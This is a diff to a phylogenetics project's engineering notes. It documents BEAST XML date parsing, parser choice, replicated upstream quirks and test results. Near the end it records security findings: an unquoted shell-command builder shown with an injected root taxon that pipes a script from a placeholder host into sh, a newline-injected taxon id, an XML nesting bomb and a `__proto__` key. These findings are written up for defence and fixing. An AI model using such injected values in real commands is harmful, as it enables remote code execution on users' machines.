@@ -202,6 +202,26 @@ editable from `../HyphAeon`; `HYPHAEON_WEIGHTS=../HyphAeon/model.safetensors HF_
   `e2e/server.spec.ts`, `server/test/time.test.js` and `mcp/test/{dates,dating,temporal}.test.js`
   resolve them from there and SKIP when the sibling checkout is absent. Nothing dated is prebaked
   into the gallery, so the time pillars have no demo record on a machine without the engine.
+- **`saxes` is pinned EXACTLY to 6.0.0** (ISC; it brings `xmlchars` 2.2.0, MIT — 2 packages, 264 KB
+  on disk, measured with `du -sk`) and is the ONLY XML parser in the tree, in `runtime/`'s
+  dependencies. It was chosen because it is the one parser in reach that REFUSES a truncated
+  document: `fast-xml-parser` 5.11.1 returns 973 of 2,000 sequences from a cut-off BEAST file with
+  no error at all, which for a date layer is a wrong answer with a green light. It uses no Node
+  builtin (`grep` for `node:` in its sources returns nothing), so it bundles into the browser
+  unchanged — verified: `SaxesParser` is in the `/time` chunks and in the analyze, temporal and
+  dating-model workers of a `HYPHAEON_PREBAKE=skip` build — and it rides into the published
+  `@veg/hyphaeon-mcp`. Its last publish is 2022-05-17, which is a feature in a parser and a reason
+  to keep the wrapper thin. (The `fast-xml-parser` comparison is the build's own measurement, not
+  re-run at integration: it is not installed here and installing it to re-measure would add the
+  dependency the choice exists to avoid.) **The three limits in `runtime/src/dates/xml.js` are
+  OURS, not the library's and not the reference's** — 16 MiB of text, 512 levels of nesting, a
+  1 MiB / 20-level entity budget — and they must stay tested. Re-measured at integration on a
+  50,001-level document (`<a>`x50,000 around one empty element): Python's ElementTree reads it in
+  **6.2 ms**, our reader with `limits.maxDepth` lifted takes **10,325.5 ms** — the quadratic
+  namespace bookkeeping the cap is there to bound — and at the default cap it refuses with
+  `XmlReadError reason "too_deep"`. A browser drop has no size cap other than the 16 MiB one, and a
+  parameter-entity reference in the internal subset is refused here where ElementTree parses on and
+  silently drops the taxon the entity named.
 
 ## Working rules
 
@@ -762,3 +782,155 @@ and that is result semantics, which lives in the runtime and not in a wrapper.
   biggest at 152,137 B; and an MCP temporal job cancelled 2.9 s into the null, which kept the record
   at **724 of 10,000 draws**, labelled partial everywhere, finding the same 16 confirmed sweeps the
   full run finds.
+
+### 2026-09-13 — BEAST XML is read, on every surface
+
+The owner asked for the feature `hyphaeon dating` has had all along (dating.py:433-442, through
+`parse_beast_xml`, dataset.py:84-233) and PrimAeon refused by name. `DATES_BEAST_XML_UNSUPPORTED` is
+retired; the date layer reads BEAST 1.x and 2.x XML in the browser, over MCP, over HTTP and in the
+runtime. **No engine change was made and none was needed** — by PLAN-TEMPORAL.md §5.1.2's rule the
+BEAST reader is app-side, beside the CSV sniffer and the Auspice walk, in `runtime/src/dates/`.
+
+- **The reader.** `runtime/src/dates/xml.js` (new) is a saxes-backed, ElementTree-shaped document
+  reader — `{tag, attrib, text, tail, children}`, `{uri}local` names, `findAllDescendants` /
+  `findChild` / `iterElements`, the DTD-entity policy and `XmlReadError {reason, line, column}`.
+  `runtime/src/dates/beast.js` (new) is the statement-by-statement port of dataset.py:84-233 plus
+  `_parse_numeric_or_calendar_date` (dataset.py:62-81) with Python's float grammar (`1_000` yes,
+  `0x10` no, `nan`/`inf` yes), `beastDatesForTaxa` (the OTHER ladder, dating.py:436-442) and
+  `beastToFasta`, which is what lets a surface handed only an XML feed the ordinary pipeline.
+- **The vocabulary.** `DATE_SCHEMA_VERSION` 1 → 2; `DATE_SOURCES` gains `beast`; coverage gains
+  `from_beast`; `DateIngest` gains a `beast` block; `DATE_DIAGNOSTIC_CODES` 32 → **43** (one code
+  removed, twelve added — verified by importing the barrel at integration). Three BEAST-only rule
+  ids (`beast_float`, `beast_ymd`, `beast_year_month`) and one BEAST-only match tier
+  (`seq_prefix_stripped`, inserted after `exact`; `DATE_MATCH_TIERS` itself is unchanged). Taxa that
+  match nothing reuse `DATES_TABLE_NO_MATCH` and duplicates reuse `DATES_DUPLICATE_METADATA`: no new
+  code was invented for a condition that already had one.
+- **`detectDateSourceKind` now decides XML by CONTENT** (the trimmed head starts `<`); `.xml` in the
+  name is the last-resort tie-break. A `.xml`-named CSV is read as a table instead of refused unread.
+- **`/time` takes one file for three inputs.** A dropped XML can be the alignment, the dates AND the
+  starting tree. `acceptFiles` is two passes — classify everything, assign the explicitly-typed
+  slots, then let the XML fill only the slots still empty (dating.py:2467-2471's `if … is None`), so
+  the answer does not depend on drop order. The page prints an intake note naming every slot the
+  file filled and every one it offered and did not get, the BEAST provenance inside the strip, and
+  the date-scale warning beside the review table. The XML is parsed ONCE, in `acceptFiles`.
+- **MCP and server keep one door: `dates_file`.** No `beast_file`, no `--beast`. `-d run.xml`
+  upstream reads `parse_beast_xml(...)['dates']` and nothing else, and an MCP call or a JSON body
+  already names `alignment` and `tree` in the same object, so there is no slot to fill and no order
+  to resolve. What the XML also carried is REPORTED — `date_review.beast` plus the
+  `DATES_BEAST_CARRIES_INPUTS` info warning — never dropped in silence.
+- **One refusal the server owns: `ALIGNMENT_IS_XML`** (422, `kind: "input"`), raised in `sizeCheck`
+  before the alignment is parsed. This closed a real hole: `parseAlignmentSequences` does not reject
+  XML, it MISREADS it — a BEAST document came back as four "sequences" named `<?xml`, `<taxon`,
+  `<alignment` and `<sequence><taxon`, the caps passed, and `POST /jobs` answered 202 and spent a
+  worker.
+
+**The quirks are replicated, not fixed, and they are now where a scientist will find them.** The
+port carries 21 `UPSTREAM QUIRK` markers; the two that change a reader's numbers are in `web/caveats.json` as
+`beast-xml-date-arithmetic` (pillars `general` and `diagnostics`, so they render on `/methods`), in
+`mcp/README.md` and in `server/README.md`, and the load-bearing one is printed at the point of use
+on `/time`:
+
+- **A BEAST calendar date is not a decimal year.** dataset.py:71-80 converts `YYYY-MM-DD` as
+  `year + (month−1)/12 + (day−1)/365.25` and `YYYY-MM` as `year + (month−0.5)/12`, a third
+  convention again. RE-MEASURED at integration against the library's own conversion over all 731
+  days of 2019–2020: mean |offset| **0.001988 yr = 0.726 days**, worst **0.007706 yr = 2.815 days**
+  (2019-03-31: 2019.2488021902807 against 2019.2410958904109); `2021-04` is 2021.2916666666667,
+  **2.460 days** off. So `hyphaeon dating --beast` agrees with these numbers and the same dates in a
+  CSV do not. `DATES_BEAST_DATE_SCALE`.
+- **The float branch has no gate at all**, and no calendar validation. Re-measured: `1799`, `2150`,
+  `50`, `-3`, `1e9` and Python's `1_000` are all kept where the library's parser returns NaN, `nan`
+  and `inf` are STORED as dates (the guard is `is not None`), `2020-13-45` reads as 2021.1204654 and
+  a masked `2020-00-00` as 2019.9139288 — a date in the previous year. `DATES_BEAST_DATE_UNGATED`.
+- Also replicated and flagged: `direction=` and `units=` are read by nothing upstream
+  (`DATES_BEAST_DIRECTION_IGNORED`); the BEAST 2 trait test is a SUBSTRING test, so `dateBackward`
+  reads as forward dates (`DATES_BEAST_TRAIT_NOT_DATE`); one alignment block of many survives,
+  chosen by TAXON count with the first winning a tie (`DATES_BEAST_MULTIPLE_ALIGNMENTS`); the `seq_`
+  dance renames sequences with no collision check and grows the date map
+  (`DATES_BEAST_SEQ_PREFIX`); a namespaced document matches nothing because `parse_beast_xml`
+  searches unqualified tags (`DATES_BEAST_NAMESPACED`); the BEAST 2 version heuristic's second
+  clause is dead code and one `spec=` anywhere labels a file "BEAST 2"; the comment strip is
+  `\[&[^\]]*\]` only and the second pass discards a HyPhy `{FG}` partition. Three divergences are
+  OURS and say so in `beast.js`'s header: the 16 MiB size cap, the 512-level depth cap and the
+  refusal of a parameter-entity reference in the internal subset.
+
+**The end-to-end path is covered** (`e2e/beast.spec.ts` and `e2e/beastFixtures.ts`, both new; three
+tests added to `e2e/server.spec.ts`). The fixtures are the reference's OWN two acceptance documents
+(tests/test_dating.py:119-134 and :152-167, character for character, the same literals
+`runtime/test/beast-xml.test.js` holds) plus one GENERATED from files that already ship: the H5N1
+example's `H5N1_HA_geo.fasta`, the `taxon,date` columns of `H5N1_HA_metadata.csv` and `H5N1_HA.nwk`,
+folded into one BEAST 1.x document with nothing added — 98 taxa × 1,698 nt, 188,900 bytes against
+the three files' 178,727 (**1.06×**; 1.12× the FASTA alone). Dropping that one file gives the SAME
+review as dropping the three: same taxa in the same order, same values, same rendered dates, and a
+section-2 clock preview identical character for character except for the file the caption names.
+Both drop orders of a FASTA beside it give the same answer, with the XML's alignment declared unused
+in the reader's own words. Over HTTP the same document dates 98 of 98 with `date_review.source`
+`beast`, `coverage.from_beast` 98 and every per-taxon value equal to the CSV job's, run side by side
+in the same test.
+
+- **Verified at integration** (engine checkout at `feat/temporal`; no engine file was touched):
+  `npm run test --workspaces --if-present` → runtime **29 files / 657 tests**, web **26 / 358**,
+  mcp **14 / 181**, server **6 / 129** — 75 files, 1,325 tests, exit 0; `cd web && npm run check` →
+  **667 files, 0 errors, 0 warnings**; `HYPHAEON_PREBAKE=skip npm run build` clean in 8.84 s;
+  `node scripts/check-caveats.mjs` ok at 25 caveats; `npx tsc --noEmit` clean in `e2e/`; Playwright
+  **86 / 86** (76 before this change: +7 browser, +3 server), 41.6 s and 84 s on two runs.
+- **Final check, after the two review rounds** (same engine checkout, still 0 modified files there).
+  The "Verified at integration" counts above predate round two and are superseded: measured twice on
+  the finished branch, `npm run test --workspaces --if-present` → runtime **29 files / 691 tests**,
+  web **26 / 367**, mcp **14 / 182**, server **6 / 130** — 75 files, **1,370 tests**, exit 0, and
+  **0 skipped, 0 todo** in all four; `npm run check` **667 files, 0 errors, 0 warnings**;
+  `HYPHAEON_PREBAKE=skip npm run build` clean in 9.1 s; Playwright **87 / 87** (not the 86 above; a
+  spec landed after that line was written), 42.5 s and 1.2 min on two runs, on ports 4321/4323
+  because 4173 belongs to a sibling checkout's preview.
+  - The three reviewer attacks were rebuilt from their descriptions and re-run. A 500-deep
+    `<alignment>` chain with 500 x 30,000 bases (15,032,405 chars, 14.34 MiB) is **refused in
+    312 ms at 96.0 MiB peak RSS**, `XmlReadError.reason` `too_much_work`. A taxon written
+    `<taxon id="A&#10;&gt;INJECTED">` reaches `beastToFasta` as a 3-taxon document and is refused
+    there (`BeastFastaError`, `BEAST_NAME_NOT_FASTA`); dropped on `/time` in a real browser that
+    refusal IS the drop's stated reason and no page text claims a fourth sequence. Six taxa carrying
+    `( ) , : ; ' [ ]` load unrefused, round-trip FASTA as the identical set, and come out of
+    `njNewick` quoted with inner `'` doubled (`'D''E'`), which `readNewick` reads back as the same
+    six tips.
+  - **One new defect of that class, found and fixed here**: `datesJson`
+    (`web/src/lib/time/downloads.ts`) built its `{taxon: value}` map as a plain `{}`, so a taxon
+    named `__proto__` — which `fastaNameHazard` correctly admits, and which a BEAST XML can declare
+    — set the object's PROTOTYPE instead of a key and vanished from the downloaded file, out of
+    `entries` and out of `undated` both (measured: a two-taxon record wrote `{"A":2002}`). The map
+    is `Object.create(null)` now and `downloads.test.ts` pins it; the test fails on the old line.
+    `constructor` and `toString` were never affected — only `__proto__` is special.
+  - `DATE_MESSAGES.XML_UNSAFE` no longer says the file "was refused before it was read", which was
+    true only for `too_large` and false for the other four reasons `ingest.js` maps to that code,
+    and no longer double-punctuates around `{error}`. A dedicated `DATES_XML_TOO_COSTLY` was
+    considered and NOT taken: it would ripple through three surfaces' documentation and the three
+    test files that enumerate the four XML codes, and the refusal sentence already names the
+    nesting, the budget and both ways out.
+  - `web/src/lib/results/packages.d.ts` now declares what round two added — `BeastFastaError`,
+    `FASTA_NAME_HAZARDS`, `fastaNameHazard`, `unsafeFastaNames`, `XML_LIMITS`, `XML_REFUSALS`,
+    `createWorkBudget`, `chargeWork`, and the `names_unsafe_for_fasta` and `work` provenance fields
+    — so a surface can catch the refusal BY TYPE rather than by its sentence.
+  - A realistic BEAUti 2.7 document (185,162 chars, 118 elements, depth 7, `<run spec="MCMC">` with
+    the `TraitSet` nested inside `<tree>` inside `<state>`, built from `H5N1_HA_geo.fasta` and its
+    metadata CSV) reads 98/98 on all three surfaces at **0.28 % of the work budget**; the same file
+    with `xmlns=` added reads as the reference reads it — nothing — and says so on all three:
+    `DATES_BEAST_NOT_BEAST` + `DATES_BEAST_NAMESPACED` in the runtime and over MCP, a
+    `422`-shaped `{kind:"input", code:"DATES_BEAST_NOT_BEAST"}` job failure over HTTP, and on
+    `/time` a refusal naming the file, "BEAST 2", the namespace, dataset.py:123-127 and both
+    remedies.
+- **Still open, and NOT this feature's doing.** `datingReferenceCommand`
+  (`runtime/src/dating/results.js:404`) and `temporalReferenceCommand`
+  (`runtime/src/temporal/results.js:411`) build a SHELL STRING with `parts.join(' ')` and quote
+  nothing. Measured: `hyphaeon dating -a my align.fasta … -d run 1.xml --root-taxon
+  A;curl$IFShttp://x.example|sh …`. A taxon id carrying `;`, `|`, a backtick or `$(` has no
+  whitespace, so `beastToFasta` admits it and it can be chosen as `--root-taxon`; a file name with a
+  space silently becomes two arguments. It is the same class as the FASTA-header refusal and the
+  BEAST path is a new door to it, but a FASTA header opened that door already and the temporal
+  pillar has the same line, so it is left for a change of its own. The fix shape is `nj.js`'s
+  `newickLabel`: quote only when a metacharacter is present, which leaves every existing assertion
+  on plain names passing.
+- **Carried.** `mcp/package.json` is still 0.5.0 although the tool schema changed (the version is
+  quoted in `web/src/routes/mcp/transcript.ts`, so the bump and the re-record belong together);
+  `scripts/parity.py` has no BEAST surface, so the port's equivalence is pinned by
+  `runtime/test/beast-xml.test.js` and by the two 98-taxon BEAST-vs-CSV equivalences (MCP clock,
+  server review) rather than by the parity gate; no gallery example is a BEAST XML; `ruleNote()` is
+  exported and rendered nowhere, which is pre-existing; PHASE6.md's refusal grid and
+  PHASE2-DATES.md's gap list carry superseded notes rather than rewrites, because they are the
+  record of what those phases did.
